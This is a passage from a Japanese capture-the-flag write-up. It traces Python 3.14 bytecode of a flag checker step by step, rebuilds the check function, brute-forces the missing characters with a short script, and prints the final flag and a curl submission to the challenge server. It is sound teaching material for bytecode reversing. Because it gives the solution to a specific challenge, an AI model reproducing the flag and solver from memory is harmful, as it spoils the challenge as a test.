if input[::-3] != '}Eq4CBLZgRlZqs7cl':
    return False
```

となります。

ここまでで、先ほど`co_consts`から推測した

```text
Al?ac?{7?5s?Mq?gZ?Rl?JR?ng?YZ?IL?HB?KC?k4?4q?GE?A}
```

が本当に正しいことが確認できました。

さて、問題は残った16文字です。

ここから一気に命令が増えて、めちゃめちゃ難しくなります。

---

## L3 ループの準備

### `LOAD_GLOBAL 3 (bytes + NULL)`

```text
LOAD_GLOBAL 3 (bytes + NULL)
```

`bytes`関数と、呼び出し用の`NULL`を積みます。

```text
実行前
[]

実行後
[bytes, NULL]
```

まだ`bytes()`は呼び出しません。

後で作るリストを`bytes(...)`へ渡すため、そのままスタックの下に残しておきます。

---

### `LOAD_GLOBAL 5 (range + NULL)`

```text
LOAD_GLOBAL 5 (range + NULL)
```

次に`range`を積みます。

```text
実行前
[bytes, NULL]

実行後
[bytes, NULL, range, NULL]
```

---

### `LOAD_SMALL_INT 16`

```text
LOAD_SMALL_INT 16
```

```text
実行前
[bytes, NULL, range, NULL]

実行後
[bytes, NULL, range, NULL, 16]
```

---

### `CALL 1`

```text
CALL 1
```

つまり

```python
range(16)
```

が呼ばれます。

```text
実行前
[bytes, NULL, range, NULL, 16]

実行後
[bytes, NULL, range(16)]
```

`bytes`はまだ下に残っています。

---

### `GET_ITER`

```text
GET_ITER
```

`range(16)`をイテレータへ変換します。

イテレータとは、値を1個ずつ順番に取り出すためのオブジェクトです。

例えば

```python
it = iter(range(3))

next(it) # 0
next(it) # 1
next(it) # 2
```

のように使えます。

今回はイテレータを`it`と書くことにします。

```text
実行前
[bytes, NULL, range(16)]

実行後
[bytes, NULL, it]
```

---

### `LOAD_FAST_AND_CLEAR 1 (i)`

```text
LOAD_FAST_AND_CLEAR 1 (i)
```

元々ローカル変数`i`に入っていた値をスタックへ退避し、その後`i`を空にします。

元の値を`old_i`と書きます。

```text
実行前
[bytes, NULL, it]

実行後
[bytes, NULL, it, old_i]
```

今回の`i`はこのループで初めて使われるため、実質的には未初期化です。

その場合は内部的には`NULL`が退避されます。

なぜこんな処理をしているのかというと...なんでだろう？

AIに聞いてみたところ

> 今回のループは元コードではリスト内包表記だったためです。
> リスト内包表記内の`i`によって、外側に同名の変数があった場合でも値を壊さないように、一旦元の値を保存しています。

らしいです。なるほどね、そんな事してるんですね。

---

### `SWAP 2`

```text
SWAP 2
```

スタックの一番上と、上から2番目を交換します。

```text
実行前
[bytes, NULL, it, old_i]

実行後
[bytes, NULL, old_i, it]
```

---

### `BUILD_LIST 0`

```text
BUILD_LIST 0
```

空のリストを作って積みます。

```text
実行前
[bytes, NULL, old_i, it]

実行後
[bytes, NULL, old_i, it, []]
```

このリストに、後ほど16個の計算結果を追加していきます。

以降、このリストを`result`と書きます。

---

### 2回目の `SWAP 2`

```text
SWAP 2
```

一番上の`result`と、その1つ下にある`it`を入れ替えます。

```text
実行前
[bytes, NULL, old_i, it, result]

実行後
[bytes, NULL, old_i, result, it]
```

ここまでで、

```text
bytes
NULL
old_i
result
it
```

という並びになりました。

`it`が一番上にあるので、ここから`FOR_ITER`で値を1個ずつ取り出していきます。

---

## L4 `for i in range(16)`の開始

### `FOR_ITER 148 (to L5)`

```text
FOR_ITER 148 (to L5)
```

一番上のイテレータ`it`から次の値を1つ取得します。

最初なら`0`です。

```text
実行前
[bytes, NULL, old_i, result, it]

実行後
[bytes, NULL, old_i, result, it, 0]
```

次の周回なら`1`、その次なら`2`と続いていき、最後は`15`です。

値を取り出せなくなったらL5へ移動します。

---

### `STORE_FAST 1 (i)`

```text
STORE_FAST 1 (i)
```

スタックの一番上を取り出して、ローカル変数`i`へ保存します。

最初の周回なら

```text
実行前
[bytes, NULL, old_i, result, it, 0]

実行後
[bytes, NULL, old_i, result, it]

i = 0
```

です。

ここまでで、

```python
for i in range(16):
```

というループになっていることが分かります。

以降、

```text
BASE = [bytes, NULL, old_i, result, it]
```

と省略して書きます。

`BASE`そのものを省略するわけではなく、毎行スタックの変化を追いやすくするための表記です。

---

## 1個目の計算

### `LOAD_SMALL_INT 7`

```text
LOAD_SMALL_INT 7
```

```text
BASE
↓
BASE + [7]
```

---

### `LOAD_GLOBAL 7 (ord + NULL)`

```text
LOAD_GLOBAL 7 (ord + NULL)
```

`ord`関数と呼び出し用`NULL`を積みます。

```text
BASE + [7]
↓
BASE + [7, ord, NULL]
```

`ord()`は、1文字をUnicodeコードポイントの整数へ変換する関数です。

例えば

```python
ord("A")
```

なら`65`になります。

---

### `LOAD_FAST_BORROW_LOAD_FAST_BORROW 1 (input, i)`

```text
LOAD_FAST_BORROW_LOAD_FAST_BORROW 1 (input, i)
```

長い名前ですが、やっていることは`input`と`i`をまとめて積んでいるだけです。

```text
BASE + [7, ord, NULL]
↓
BASE + [7, ord, NULL, input, i]
```

---

### `LOAD_SMALL_INT 3`

```text
BASE + [7, ord, NULL, input, i]
↓
BASE + [7, ord, NULL, input, i, 3]
```

---

### `BINARY_OP 5 (*)`

```text
BINARY_OP 5 (*)
```

スタックの一番上にある`i`と`3`を掛けます。

```text
BASE + [7, ord, NULL, input, i, 3]
↓
BASE + [7, ord, NULL, input, i * 3]
```

---

### `BINARY_OP 26 ([])`

```text
BINARY_OP 26 ([])
```

`input`と`i * 3`を使って添字アクセスします。

```text
BASE + [7, ord, NULL, input, i * 3]
↓
BASE + [7, ord, NULL, input[i * 3]]
```

この辺から「おっ」となりますね。

本当に式が導き出せてる感じがします。

---

### `CALL 1`

```text
CALL 1
```

CALL直前を見ると

```text
[ord, NULL, input[i * 3]]
```

なので、

```python
ord(input[i * 3])
```

を実行します。

```text
BASE + [7, ord, NULL, input[i * 3]]
↓
BASE + [7, ord(input[i * 3])]
```

---

### `BINARY_OP 5 (*)`

```text
BINARY_OP 5 (*)
```

7と`ord(...)`を掛けます。

```text
BASE + [7, ord(input[i * 3])]
↓
BASE + [7 * ord(input[i * 3])]
```

---

### `LOAD_CONST 6 (256)`

```text
BASE + [7 * ord(input[i * 3])]
↓
BASE + [7 * ord(input[i * 3]), 256]
```

---

### `BINARY_OP 6 (%)`

```text
BINARY_OP 6 (%)
```

256で割った余りを取ります。

```text
BASE + [7 * ord(input[i * 3]), 256]
↓
BASE + [7 * ord(input[i * 3]) % 256]
```

1個目の値が完成しました。

長いので、これを`A`と置きます。

```python
A = 7 * ord(input[i * 3]) % 256
```

現在のスタックは

```text
BASE + [A]
```

です。

---

## 2個目の計算

### `LOAD_SMALL_INT 5`

```text
BASE + [A]
↓
BASE + [A, 5]
```

---

### `LOAD_GLOBAL 7 (ord + NULL)`

```text
BASE + [A, 5]
↓
BASE + [A, 5, ord, NULL]
```

また`ord`かよ...

---

### `LOAD_FAST_BORROW_LOAD_FAST_BORROW 1 (input, i)`

```text
BASE + [A, 5, ord, NULL]
↓
BASE + [A, 5, ord, NULL, input, i]
```

さっきと同じですね。`input`と`i`を入れてるだけ。

---

### `LOAD_SMALL_INT 3`

```text
BASE + [A, 5, ord, NULL, input, i]
↓
BASE + [A, 5, ord, NULL, input, i, 3]
```

---

### `BINARY_OP 5 (*)`

```text
BASE + [A, 5, ord, NULL, input, i, 3]
↓
BASE + [A, 5, ord, NULL, input, i * 3]
```

---

### `LOAD_SMALL_INT 1`

```text
BASE + [A, 5, ord, NULL, input, i * 3]
↓
BASE + [A, 5, ord, NULL, input, i * 3, 1]
```

---

### `BINARY_OP 0 (+)`

```text
BASE + [A, 5, ord, NULL, input, i * 3, 1]
↓
BASE + [A, 5, ord, NULL, input, i * 3 + 1]
```

おや、今度はプラスですね。

---

### `BINARY_OP 26 ([])`

```text
BASE + [A, 5, ord, NULL, input, i * 3 + 1]
↓
BASE + [A, 5, ord, NULL, input[i * 3 + 1]]
```

---

### `CALL 1`

```text
BASE + [A, 5, ord, NULL, input[i * 3 + 1]]
↓
BASE + [A, 5, ord(input[i * 3 + 1])]
```

つまり

```python
ord(input[i * 3 + 1])
```

です。

---

### `BINARY_OP 5 (*)`

```text
BASE + [A, 5, ord(input[i * 3 + 1])]
↓
BASE + [A, 5 * ord(input[i * 3 + 1])]
```

---

### `LOAD_CONST 6 (256)`

```text
BASE + [A, 5 * ord(input[i * 3 + 1])]
↓
BASE + [A, 5 * ord(input[i * 3 + 1]), 256]
```

---

### `BINARY_OP 6 (%)`

```text
BASE + [A, 5 * ord(input[i * 3 + 1]), 256]
↓
BASE + [A, 5 * ord(input[i * 3 + 1]) % 256]
```

2個目の値を`B`と置きます。

```python
B = 5 * ord(input[i * 3 + 1]) % 256
```

スタックは

```text
BASE + [A, B]
```

です。

---

### `BINARY_OP 12 (^)`

```text
BINARY_OP 12 (^)
```

`^`はXORです。

```text
BASE + [A, B]
↓
BASE + [A ^ B]
```

ここまでで、1個目と2個目の計算結果がXORされました。

---

## 3個目の計算

### `LOAD_SMALL_INT 3`

```text
BASE + [A ^ B]
↓
BASE + [A ^ B, 3]
```

---

### `LOAD_GLOBAL 7 (ord + NULL)`

```text
BASE + [A ^ B, 3]
↓
BASE + [A ^ B, 3, ord, NULL]
```

---

### `LOAD_FAST_BORROW_LOAD_FAST_BORROW 1 (input, i)`

```text
BASE + [A ^ B, 3, ord, NULL]
↓
BASE + [A ^ B, 3, ord, NULL, input, i]
```

---

### `LOAD_SMALL_INT 3`

```text
BASE + [A ^ B, 3, ord, NULL, input, i]
↓
BASE + [A ^ B, 3, ord, NULL, input, i, 3]
```

---

### `BINARY_OP 5 (*)`

```text
BASE + [A ^ B, 3, ord, NULL, input, i, 3]
↓
BASE + [A ^ B, 3, ord, NULL, input, i * 3]
```

---

### `LOAD_SMALL_INT 2`

```text
BASE + [A ^ B, 3, ord, NULL, input, i * 3]
↓
BASE + [A ^ B, 3, ord, NULL, input, i * 3, 2]
```

---

### `BINARY_OP 0 (+)`

```text
BASE + [A ^ B, 3, ord, NULL, input, i * 3, 2]
↓
BASE + [A ^ B, 3, ord, NULL, input, i * 3 + 2]
```

---

### `BINARY_OP 26 ([])`

```text
BASE + [A ^ B, 3, ord, NULL, input, i * 3 + 2]
↓
BASE + [A ^ B, 3, ord, NULL, input[i * 3 + 2]]
```

ここで出てきました。

先ほどまで分からなかった文字は

```text
input[2]
input[5]
input[8]
input[11]
...
```

でした。

これは全部、

```python
input[i * 3 + 2]
```

で表せます。

つまり、この3個目の処理が残りの`?`をチェックしている可能性が高そうです。

---

### `CALL 1`

```text
BASE + [A ^ B, 3, ord, NULL, input[i * 3 + 2]]
↓
BASE + [A ^ B, 3, ord(input[i * 3 + 2])]
```

---

### `BINARY_OP 5 (*)`

```text
BASE + [A ^ B, 3, ord(input[i * 3 + 2])]
↓
BASE + [A ^ B, 3 * ord(input[i * 3 + 2])]
```

---

### `LOAD_SMALL_INT 23`

```text
BASE + [A ^ B, 3 * ord(input[i * 3 + 2])]
↓
BASE + [A ^ B, 3 * ord(input[i * 3 + 2]), 23]
```

---

### `BINARY_OP 0 (+)`

```text
BASE + [A ^ B, 3 * ord(input[i * 3 + 2]), 23]
↓
BASE + [A ^ B, 3 * ord(input[i * 3 + 2]) + 23]
```

---

### `LOAD_CONST 6 (256)`

```text
BASE + [A ^ B, 3 * ord(input[i * 3 + 2]) + 23]
↓
BASE + [A ^ B, 3 * ord(input[i * 3 + 2]) + 23, 256]
```

---

### `BINARY_OP 6 (%)`

```text
BASE + [A ^ B, 3 * ord(input[i * 3 + 2]) + 23, 256]
↓
BASE + [A ^ B, (3 * ord(input[i * 3 + 2]) + 23) % 256]
```

3個目の値を`C`とします。

```python
C = (3 * ord(input[i * 3 + 2]) + 23) % 256
```

現在は

```text
BASE + [A ^ B, C]
```

です。

---

### `BINARY_OP 12 (^)`

```text
BASE + [A ^ B, C]
↓
BASE + [A ^ B ^ C]
```

これで、1周につき最終的に

```python
A ^ B ^ C
```

という1個の整数が作られます。

式を全部戻すと

```python
(7 * ord(input[i * 3]) % 256) \
^ (5 * ord(input[i * 3 + 1]) % 256) \
^ ((3 * ord(input[i * 3 + 2]) + 23) % 256)
```

です。

長かった...やっと求められましたね！

---

### `LIST_APPEND 2`

```text
LIST_APPEND 2
```

計算結果を`result`へ追加します。

実行前は

```text
[bytes, NULL, old_i, result, it, A ^ B ^ C]
```

です。

一番上の`A ^ B ^ C`を取り出します。

```text
[bytes, NULL, old_i, result, it]
```

`LIST_APPEND 2`は、値を取り出した後の「上から2番目」にあるリストへ追加します。

今の上から2番目は`result`なので、

```python
result.append(A ^ B ^ C)
```

となります。

リスト自体はスタックに残ります。

```text
実行前
[bytes, NULL, old_i, result, it, A ^ B ^ C]

実行後
[bytes, NULL, old_i, result, it]
```

---

### `JUMP_BACKWARD 150 (to L4)`

```text
JUMP_BACKWARD 150 (to L4)
```

L4へ戻ります。

スタックには変化がありません。

```text
[bytes, NULL, old_i, result, it]
→
[bytes, NULL, old_i, result, it]
```

再び`FOR_ITER`が実行され、

```text
i = 1
i = 2
...
i = 15
```

と16回繰り返します。

ここまでをPythonへ直すと、

```python
result = []

for i in range(16):
    A = 7 * ord(input[i * 3]) % 256
    B = 5 * ord(input[i * 3 + 1]) % 256
    C = (3 * ord(input[i * 3 + 2]) + 23) % 256

    result.append(A ^ B ^ C)
```

です。

---

## L5 ループ終了後

`i = 15`まで処理し終わると、次の`FOR_ITER`で値を取得できなくなり、L5へ移動します。

ここはPython 3.14のループ内部処理が少し入ります。

説明上の論理スタックは

```text
[bytes, NULL, old_i, result, it]
```

と考えてください。

CPython内部ではイテレータ高速化用の補助値も管理されていますが、元のPythonコードを読む上では重要ではありません。

### `END_FOR`

```text
END_FOR
```

forループ終了時の内部的な後処理です。

ループ終了に使われた内部値を取り除きます。

元のPythonコードに直接対応する処理はありません。

論理的には、

```text
[bytes, NULL, old_i, result, it]
→
[bytes, NULL, old_i, result, it]
```

と考えて問題ありません。

---

### `POP_ITER`

```text
POP_ITER
```

ループで使っていたイテレータを取り除きます。

```text
実行前
[bytes, NULL, old_i, result, it]

実行後
[bytes, NULL, old_i, result]
```

---

### `SWAP 2`

```text
SWAP 2
```

一番上の`result`と、その1つ下の`old_i`を交換します。

```text
実行前
[bytes, NULL, old_i, result]

実行後
[bytes, NULL, result, old_i]
```

---

### `STORE_FAST 1 (i)`

```text
STORE_FAST 1 (i)
```

退避していた元の`i`を戻します。

```text
実行前
[bytes, NULL, result, old_i]

実行後
[bytes, NULL, result]

i = old_i
```

先ほど説明した通り、リスト内包表記内で使った`i`が外側へ影響しないようにするための後処理です。

---

### `CALL 1`

```text
CALL 1
```

現在のスタックは

```text
[bytes, NULL, result]
```

です。

したがって、

```python
bytes(result)
```

が実行されます。

```text
実行前
[bytes, NULL, result]

実行後
[bytes(result)]
```

ここで、16個の整数が入ったリストが16バイトの`bytes`へ変換されます。

---

### `LOAD_CONST 7 (...)`

```text
LOAD_CONST 7 (b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02')
```

先ほど謎だった16バイトの固定値が、ここで登場します。

```text
実行前
[bytes(result)]

実行後
[
  bytes(result),
  b'\xbc\x72\x51\x35\xc1\xfc\x07\x23\xfa\xac\xfc\xcd\x98\x5f\x3e\x02'
]
```

つまり、`co_consts`で出てきた謎の16バイトは、先ほどの計算結果と比較するための正解値だったようです。

---

### `COMPARE_OP 119 (bool(!=))`

```text
COMPARE_OP 119 (bool(!=))
```

2つのbytesを比較します。

```text
実行前
[bytes(result), target]

実行後
[bytes(result) != target]
```

---

### `POP_JUMP_IF_FALSE 3 (to L6)`

```text
POP_JUMP_IF_FALSE 3 (to L6)
```

比較結果が`False`ならL6へ移動します。

つまり、

```python
bytes(result) == target
```

なら成功です。

```text
実行前
[比較結果]

実行後
[]
```

---

### `NOT_TAKEN`

```text
[]
→
[]
```

内部用なので特に処理はありません。

---

### `LOAD_CONST 1 (False)`

一致していなかった場合、

```text
[]
→
[False]
```

---

### `RETURN_VALUE`

```python
return False
```

です。

つまりこの部分は、

```python
if bytes(result) != b'\xbc\x72\x51\x35\xc1\xfc\x07\x23\xfa\xac\xfc\xcd\x98\x5f\x3e\x02':
    return False
```

となります。

---

## L6 全チェック成功

### `LOAD_CONST 8 (True)`

```text
[]
→
[True]
```

---

### `RETURN_VALUE`

```text
[True]
→
関数終了
```

つまり、

```python
return True
```

です。

これで、`check`関数の通常処理を全部復元できました。

---

## `check`関数を元に戻す

以上をまとめると、`check`関数はこのような処理になっていることが分かります。

```python
def check(input):
    if len(input) != 50:
        return False

    if input[::3] != "Aa{5MgRJnYIHKk4GA":
        return False

    if input[::-3] != "}Eq4CBLZgRlZqs7cl":
        return False

    result = []

    for i in range(16):
        A = 7 * ord(input[i * 3]) % 256
        B = 5 * ord(input[i * 3 + 1]) % 256
        C = (3 * ord(input[i * 3 + 2]) + 23) % 256

        result.append(A ^ B ^ C)

    if bytes(result) != b'\xbc\x72\x51\x35\xc1\xfc\x07\x23\xfa\xac\xfc\xcd\x98\x5f\x3e\x02':
        return False

    return True
```

長かったですが、ようやく`check`関数の処理が判明しました！

---

## 残り16文字を特定

ここまででフラグは、

```text
Al?ac?{7?5s?Mq?gZ?Rl?JR?ng?YZ?IL?HB?KC?k4?4q?GE?A}
```

まで分かっています。

そして、`?`になっている場所は

```text
2, 5, 8, 11, ...
```

です。

先ほど逆アセンブルした式を見ると、この場所はちょうど

```python
input[i * 3 + 2]
```

になっています。

さらに、1文字目と2文字目に当たる

```python
input[i * 3]
input[i * 3 + 1]
```

は、`input[::3]`と`input[::-3]`の条件ですでに判明しています。

つまり1ブロックごとに、

```text
既知
既知
未知
```

という状態です。

例えば最初の3文字は

```text
Al?
```

です。

チェック式は、

```python
A = 7 * ord("A") % 256
B = 5 * ord("l") % 256
C = (3 * ord("?") + 23) % 256

A ^ B ^ C
```

となり、この値が最初の正解バイト`0xbc`になる文字を探せばよいです。

未知文字は1文字ずつ独立してチェックされているため、16文字をまとめて総当たりする必要はありません。

表示可能なASCII文字を1文字ずつ試せば十分です。

```python
known_a = "Aa{5MgRJnYIHKk4GA"
known_reverse = "}Eq4CBLZgRlZqs7cl"

target = b'\xbc\x72\x51\x35\xc1\xfc\x07\x23\xfa\xac\xfc\xcd\x98\x5f\x3e\x02'

flag = ["?"] * 50

# input[::3] を埋める
for i, c in enumerate(known_a):
    flag[i * 3] = c

# input[::-3] を埋める
for i, c in enumerate(known_reverse):
    flag[49 - i * 3] = c

# input[i * 3 + 2] の部分だけ1文字ずつ総当たり
for i in range(16):
    first = flag[i * 3]
    second = flag[i * 3 + 1]

    for candidate in range(32, 127):
        value = (
            (7 * ord(first) % 256)
            ^ (5 * ord(second) % 256)
            ^ ((3 * candidate + 23) % 256)
        )

        if value == target[i]:
            flag[i * 3 + 2] = chr(candidate)
            break

print("".join(flag))
```

実行すると、

```text
Alpaca{7X5svMqHgZHRlZJR8ngLYZNILxHBxKCAk454qpGE1A}
```

となりました！

念のため、取得したフラグを`/check`へ送って確認します。

```bash
curl -X POST \
  --data-urlencode 'input=Alpaca{7X5svMqHgZHRlZJR8ngLYZNILxHBxKCAk454qpGE1A}' \
  'http://34.170.146.252:xxxxx/check'
```

結果は、

```text
That's the correct flag!
```

ドパ～～～～～～～～～～～～～～～！！！！！！！！！！！

## Flag

```text
Alpaca{7X5svMqHgZHRlZJR8ngLYZNILxHBxKCAk454qpGE1A}
```

## 感想

むずすぎるんだよ。

でもくっそ面白かったです。
